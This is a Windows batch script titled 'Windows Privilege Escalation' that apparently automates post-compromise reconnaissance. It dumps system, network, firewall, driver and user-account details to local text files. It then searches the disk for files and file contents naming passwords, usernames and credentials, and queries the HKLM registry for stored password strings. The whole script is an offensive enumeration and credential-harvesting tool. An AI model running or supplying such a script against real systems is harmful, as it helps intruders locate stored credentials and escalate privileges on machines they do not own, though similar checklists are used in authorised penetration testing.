echo off
cls
@echo Windows Privilege Escalation
@echo Created by Justine Dela Torre (Jasutin)
	cls
	echo on
	cls
	timeout 1
	cls
	echo off
	cls
	timeout 1
	cls
	color A
	cls
	timeout 5
	cls
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version" > os.txt
	cls
	timeout 2
	cls
	ipconfig /all > ip_info.txt
	cls
	timeout 3
	cls
	ipconfig /displaydns > dns_info.txt
	cls
	timeout 1
	cls
	route print > route_info.txt
	cls
	timeout 1
	cls
	arp -a > arp_info.txt
	cls
	timeout 1
	cls
	netstat -a -p TCP > tcp_info.txt
	cls
	timeout 3
	cls
	netstat -a -p UDP > udp_info.txt
	cls
	timeout 1
	cls
	netsh wlan show all > network_info.txt
	cls
	timeout 1
	cls
	netsh firewall show state > firewall_status.txt
	cls
	timeout 1
	cls
	netsh firewall show config >> firewall_status.txt
	cls
	timeout 1
	cls
	DRIVERQUERY > kernel_driver.txt
	cls
	timeout 5
	cls
	net user > user_accounts.txt
	cls
	timeout 1
	cls
	dir /s *pass* *password* *user* *username* *cred* *credential* > info_gathering.txt
	cls
	timeout 10
	cls
	findstr /si username *.xml *.ini *.txt > usernames.txt
	cls
	timeout 10
	cls
	findstr /si password *.xml *.ini *.txt > passwords.txt
	cls
	timeout 10
	cls
	reg query HKLM /f password /t REG_SZ /s > registrycreds.txt
	cls
	timeout 10
	cls